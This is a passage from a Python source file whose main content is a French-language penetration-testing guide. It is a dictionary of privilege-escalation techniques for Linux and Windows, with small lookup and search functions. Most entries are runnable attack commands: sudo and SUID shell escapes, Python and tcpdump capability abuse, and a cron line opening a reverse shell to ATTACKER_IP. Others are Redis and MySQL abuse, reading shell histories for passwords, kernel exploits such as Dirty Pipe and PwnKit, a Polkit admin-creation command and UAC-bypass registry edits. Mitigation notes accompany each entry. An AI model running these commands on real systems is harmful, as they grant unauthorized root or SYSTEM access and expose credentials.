                    {
                        "title": "Vérification PATH",
                        "description": "PATH manipulable?",
                        "command": "echo $PATH",
                        "expected_output": "Chemin avec dossiers accessibles en écriture"
                    },
                    {
                        "title": "Historique bash/zsh",
                        "description": "Recherche mots de passe en clair",
                        "command": "cat ~/.bash_history; cat ~/.zsh_history",
                        "expected_output": "Mots de passe, secrets exposés"
                    },
                    {
                        "title": "Fichiers de configuration sensibles",
                        "description": "Fichiers avec credentials potentiels",
                        "command": "find /home -name '*.txt' -o -name '*.conf' -o -name '*.config' 2>/dev/null | head -20",
                        "expected_output": "Fichiers avec credentials potentiels"
                    }
                ],
                "mitigation": "Principe du moindre privilège, audit régulier SUID/SGID, rotaton des mots de passe, séparation des comptes"
            },
            "linux_sudo_exploit": {
                "name": "Exploitation SUDO",
                "severity": "Critical",
                "description": "Exploiter des privilèges sudo mal configurés",
                "steps": [
                    {
                        "title": "Enumérer SUDO",
                        "description": "Lister les commandes sudo autorisées",
                        "command": "sudo -l",
                        "expected_output": "Commandes NOPASSWD affichées"
                    },
                    {
                        "title": "Exploitation FIND",
                        "description": "Si find est autorisé sans mot de passe",
                        "command": "sudo find /etc/passwd -exec /bin/bash \\;",
                        "expected_output": "Shell root obtenu"
                    },
                    {
                        "title": "Exploitation VIM/VI",
                        "description": "Si vim/vi est autorisé",
                        "command": "sudo vim -c ':!/bin/bash'",
                        "expected_output": "Shell root via vim"
                    },
                    {
                        "title": "Exploitation Nmap",
                        "description": "Si nmap est autorisé (mode inter actif)",
                        "command": "echo 'os.execute(\"/bin/bash\")' | sudo nmap --script",
                        "expected_output": "Shell root via Lua nmap"
                    },
                    {
                        "title": "Exploitation Git",
                        "description": "Si git est autorisé",
                        "command": "sudo PAGER='sh -c \"exec sh <&1\"' git -p help",
                        "expected_output": "Shell root via git pager"
                    },
                    {
                        "title": "Exploitation Python",
                        "description": "Si python est autorisé",
                        "command": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
                        "expected_output": "Shell root via Python"
                    },
                    {
                        "title": "Exploitation LESS/MORE",
                        "description": "Si less/more est autorisé",
                        "command": "sudo less /etc/passwd puis tape 'v' puis ':!/bin/bash'",
                        "expected_output": "Shell root via éditeur less"
                    }
                ],
                "mitigation": "Minimiser les privilèges sudo, éviter NOPASSWD, whitelist stricte des commandes, logging sudo"
            },
            "linux_suid_exploit": {
                "name": "Exploitation SUID/SGID",
                "severity": "Critical",
                "description": "Exploiter des binaires SUID mal configurés",
                "steps": [
                    {
                        "title": "Recherche SUID",
                        "description": "Enumérer tous les binaires SUID",
                        "command": "find / -perm -4000 -type f 2>/dev/null",
                        "expected_output": "Liste des binaires SUID"
                    },
                    {
                        "title": "Vérifier GTFOBins",
                        "description": "Consulter GTFOBins pour exploits connus",
                        "command": "curl -s https://gtfobins.github.io | grep <binary_name>",
                        "expected_output": "Techniques d'exploitation SUID documentées"
                    },
                    {
                        "title": "Exploitation FIND",
                        "description": "Si find est SUID",
                        "command": "find . -exec /bin/bash -p \\;",
                        "expected_output": "Shell root via find"
                    },
                    {
                        "title": "Exploitation NANO",
                        "description": "Si nano est SUID",
                        "command": "nano puis Ctrl+R puis Ctrl+X puis /bin/bash",
                        "expected_output": "Shell root via nano"
                    },
                    {
                        "title": "Exploitation VIM",
                        "description": "Si vim est SUID",
                        "command": "vim +':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-pc\", \"/bin/bash\")'",
                        "expected_output": "Shell root via vim"
                    },
                    {
                        "title": "Exploitation LESS",
                        "description": "Si less est SUID",
                        "command": "less /etc/passwd puis tape 'v' pour éditeur, puis ':!/bin/bash'",
                        "expected_output": "Shell root via less"
                    },
                    {
                        "title": "Exploitation PASSWD",
                        "description": "Si passwd est SUID et vulnérable",
                        "command": "passwd puis test avec ancien mot de passe",
                        "expected_output": "Accès root via changement mot de passe"
                    }
                ],
                "mitigation": "Minimiser les binaires SUID, utiliser capabilities au lieu de SUID, audit régulier, whitelist stricte"
            },
            "linux_capabilities": {
                "name": "Exploitation Linux Capabilities",
                "severity": "High",
                "description": "Exploiter les capabilities élevées",
                "steps": [
                    {
                        "title": "Recherche capabilities",
                        "description": "Enumérer les capabilities",
                        "command": "getcap -r / 2>/dev/null",
                        "expected_output": "Capabilities privilégiées listées"
                    },
                    {
                        "title": "Exploitation CAP_DAC_READ_SEARCH",
                        "description": "Bypass permissions de lecture",
                        "command": "getcap -r / 2>/dev/null | grep 'cap_dac_read_search+ep'",
                        "expected_output": "Binaires avec lecture bypass"
                    },
                    {
                        "title": "Exploitation CAP_DAC_OVERRIDE",
                        "description": "Bypass permissions d'écriture",
                        "command": "getcap -r / 2>/dev/null | grep 'cap_dac_override+ep'",
                        "expected_output": "Binaires avec écriture bypass"
                    },
                    {
                        "title": "Exploitation python avec CAP_SETUID",
                        "description": "Python capable de changer UID",
                        "command": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                        "expected_output": "Shell root via capabilities Python"
                    },
                    {
                        "title": "Exploitation tcpdump",
                        "description": "Si tcpdump a cap_sys_admin",
                        "command": "tcpdump -n -i lo -G 1 -W 1 -w /dev/null -z /bin/bash",
                        "expected_output": "Shell root via tcpdump"
                    }
                ],
                "mitigation": "Minimiser les capabilities, principe du moindre privilège, monitorer les capabilities"
            },
            "linux_cron_exploit": {
                "name": "Exploitation Tâches Cron",
                "severity": "High",
                "description": "Exploiter des crontabs mal sécurisés",
                "steps": [
                    {
                        "title": "Enumération crontab",
                        "description": "Rechercher tous les crontabs",
                        "command": "cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null; ls -la /var/spool/cron/crontabs/ 2>/dev/null",
                        "expected_output": "Tâches cron trouvées"
                    },
                    {
                        "title": "Vérifier permissions",
                        "description": "Trouver crontabs modifiables",
                        "command": "find /etc/cron* -writable 2>/dev/null",
                        "expected_output": "Fichiers cron accessibles en écriture"
                    },
                    {
                        "title": "Exploitation cron racine",
                        "description": "Script exécuté par root",
                        "command": "echo '* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /etc/crontab",
                        "expected_output": "Reverse shell root en 1 minute"
                    },
                    {
                        "title": "Wildcard injection",
                        "description": "Si des wildcards sont utilisés dans cron",
                        "command": "touch '/var/spool/cron/malicious' et configurer cron pour exécuter *",
                        "expected_output": "Commande arbitraire exécutée"
                    },
                    {
                        "title": "PATH manipulation",
                        "description": "Si PATH utilisé dans cron",
                        "command": "Vérifier PATH et créer binaire malicieux avec nom de commande",
                        "expected_output": "Commande malveillante exécutée à la place"
                    }
                ],
                "mitigation": "Permissions strictes sur /etc/crontab, éviter wildcards, PATH absolu, monitoring des crontabs"
            },
            "linux_kernel_exploit": {
                "name": "Exploitation Kernel",
                "severity": "Critical",
                "description": "Exploiter des vulnérabilités kernel pour privesc",
                "steps": [
                    {
                        "title": "Identifier kernel version",
                        "description": "Version exacte du kernel",
                        "command": "uname -a",
                        "expected_output": "Version kernel: 5.x.x ou 4.x.x"
                    },
                    {
                        "title": "Chercher exploits",
                        "description": "Rechercher exploit publics",
                        "command": "searchsploit kernel 5.x ou Google: 'kernel 5.x exploit CVE'",
                        "expected_output": "Exploits publics trouvés"
                    },
                    {
                        "title": "Dirty Cow",
                        "description": "Si kernel < 4.8.3",
                        "command": "gcc -pthread dirty.c -o dirty -lcrypt; ./dirty",
                        "expected_output": "Root via Dirty Cow exploit"
                    },
                    {
                        "title": "Dirty Pipe",
                        "description": "Si kernel >= 5.8 < 5.16.11",
                        "command": "gcc dirtypipe.c -o dirtypipe; ./dirtypipe /etc/passwd",
                        "expected_output": "Root via Dirty Pipe"
                    },
                    {
                        "title": "PwnKit",
                        "description": "pkexec vulnerable (CVE-2021-4034)",
                        "command": "wget exploit; make; ./pwnkit",
                        "expected_output": "Root shell instantané"
                    },
                    {
                        "title": "Polkit CVE-2021-3560",
                        "description": "Polkit authentication bypass",
                        "command": "dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:hacker string:'Hacker User' int32:1",
                        "expected_output": "Nouvel utilisateur admin créé"
                    }
                ],
                "mitigation": "Mise à jour kernel régulière, patch management, reboot après updates, kernel hardening"
            },
            "linux_network_exploit": {
                "name": "Exploitation Configuration Réseau",
                "severity": "High",
                "description": "Exploiter des configurations réseau faibles",
                "steps": [
                    {
                        "title": "Partages NFS",
                        "description": "Vérifier NFS montés",
                        "command": "mount | grep nfs; cat /etc/fstab | grep nfs",
                        "expected_output": "Partages NFS trouvés"
                    },
                    {
                        "title": "Exploitation NFS no_root_squash",
                        "description": "Si no_root_squash activé",
                        "command": "Créer un SUID sur le partage NFS et l'exécuter localement",
                        "expected_output": "Privilege escalation via NFS"
                    },
                    {
                        "title": "Services en écoute",
                        "description": "Services réseau locaux",
                        "command": "netstat -tulpn; ss -tulpn",
                        "expected_output": "Services MySQL, Redis, MongoDB, etc."
                    },
                    {
                        "title": "Exploitation MySQL",
                        "description": "Si MySQL root sans mot de passe",
                        "command": "mysql -u root && SELECT sys_exec('chmod +s /bin/bash');",
                        "expected_output": "SUID bash créé"
                    },
                    {
                        "title": "Exploitation Redis",
                        "description": "Redis exposé localement",
                        "command": "redis-cli flushall; redis-cli set payload 'chmod +s /bin/bash'; config set dir /etc/; config set dbfilename crontab; save",
                        "expected_output": "Commande root via Redis"
                    }
                ],
                "mitigation": "Sécuriser NFS, désactiver root access, pare-feu local, services en localhost only"
            },
            "windows_privesc": {
                "name": "Windows Privilege Escalation",
                "severity": "Critical",
                "description": "Méthodologie complète pour obtenir SYSTEM sur Windows",
                "steps": [
                    {
                        "title": "Vérifications initiales",
                        "description": "Informations système et utilisateur",
                        "command": "whoami; whoami /priv; systeminfo; hostname",
                        "expected_output": "Infos utilisateur, privilèges, OS version"
                    },
                    {
                        "title": "Enumération privilèges",
                        "description": "Privilèges et groupes utilisateur",
                        "command": "whoami /priv; whoami /groups; net user %USERNAME%",
                        "expected_output": "SeBackupPrivilege, SeDebugPrivilege, etc."
                    },
                    {
                        "title": "Vérification groupes locaux",
                        "description": "Membres des groupes privilégiés",
                        "command": "net localgroup administrators; net localgroup 'Remote Desktop Users'",
                        "expected_output": "Liste des administrateurs et RDP users"
                    },
                    {
                        "title": "Enumération services",
                        "description": "Services mal configurés",
                        "command": "wmic service get name,pathname,displayname,startmode | findstr /i auto",
                        "expected_output": "Services auto-start avec chemins accessibles"
                    },
                    {
                        "title": "Vérification UAC",
                        "description": "Niveau UAC configuré",
                        "command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA",
                        "expected_output": "EnableLUA = 1 (UAC activé)"
                    },
                    {
                        "title": "Unquoted service paths",
                        "description": "Chemins service sans guillemets",
                        "command": "wmic service get name,pathname,displayname,startmode | findstr /i /v 'C:\\Windows' | findstr /i auto",
                        "expected_output": "Services avec chemins sans guillemets"
                    },
                    {
                        "title": "Vérification permissions fichiers",
                        "description": "Fichiers system accessibles en écriture",
                        "command": "icacls C:\\Windows\\System32\\taskkill.exe",
                        "expected_output": "Permissions d'écriture détectées"
                    },
                    {
                        "title": "Historique PowerShell",
                        "description": "Recherche credentials exposés",
                        "command": "type C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
                        "expected_output": "Mots de passe, secrets en clair"
                    }
                ],
                "mitigation": "Principe du moindre privilège, contrôle UAC strict, audit services, monitoring"
            },
            "windows_uac_bypass": {
                "name": "Bypass UAC",
                "severity": "High",
                "description": "Contourner User Account Control Windows",
                "steps": [
                    {
                        "title": "Vérifier version Windows",
                        "description": "Version exacte pour choisir exploit",
                        "command": "systeminfo | findstr /B /C:'OS Name' /C:'OS Version'",
                        "expected_output": "Windows 10/11 version exacte"
                    },
                    {
                        "title": "UACMe",
                        "description": "Framework de bypass UAC",
                        "command": "UACMe.exe 33 ou UACMe.exe 64",
                        "expected_output": "Shell elevée obtenue"
                    },
                    {
                        "title": "Fodhelper bypass",
                        "description": "Exploit fodhelper.exe",
                        "command": "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d 'C:\\Windows\\System32\\cmd.exe' /f",
                        "expected_output": "Commande exécutée en elevée"
                    },
                    {
                        "title": "Event Viewer bypass",
                        "description": "Bypass via eventvwr",
                        "command": "Reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f",
                        "expected_output": "Cmd elevée via eventvwr"
                    },
                    {
                        "title": "DLL hijacking",
                        "description": "Si SeImpersonatePrivilege",
                        "command": "getsystem via Metasploit ou PrintSpoofer.exe",
                        "expected_output": "SYSTEM shell"
                    }
                ],
                "mitigation": "UAC au niveau maximum, patchs Windows à jour, whitelist applications, monitoring"
            }
        }
    }
}


def get_all_categories() -> List[str]:
    """Retourne toutes les catégories disponibles"""
    return list(GUIDES.keys())


def get_vulnerabilities_for_category(category: str) -> List[str]:
    """Retourne toutes les vulnérabilités d'une catégorie"""
    if category not in GUIDES:
        return []
    return list(GUIDES[category]["vulnerabilities"].keys())


def get_vulnerability_details(category: str, vuln_id: str) -> Dict:
    """Retourne les détails complets d'une vulnérabilité"""
    if category not in GUIDES:
        return {}
    if vuln_id not in GUIDES[category]["vulnerabilities"]:
        return {}
    
    return GUIDES[category]["vulnerabilities"][vuln_id]


def search_vulnerabilities(query: str) -> List[Dict]:
    """
    Recherche des vulnérabilités par mot-clé
    
    Args:
        query: Terme de recherche
    
    Returns:
        Liste de vulnérabilités correspondantes
    """
    results = []
    query_lower = query.lower()
    
    for category_key, category_data in GUIDES.items():
        for vuln_id, vuln_data in category_data["vulnerabilities"].items():
            # Recherche dans nom, description, steps
            if (query_lower in vuln_data["name"].lower() or
                query_lower in vuln_data["description"].lower()):
                results.append({
                    "category": category_key,
                    "category_name": category_data["name"],
                    "id": vuln_id,
                    "name": vuln_data["name"],
                    "severity": vuln_data["severity"]
                })
    
    return results

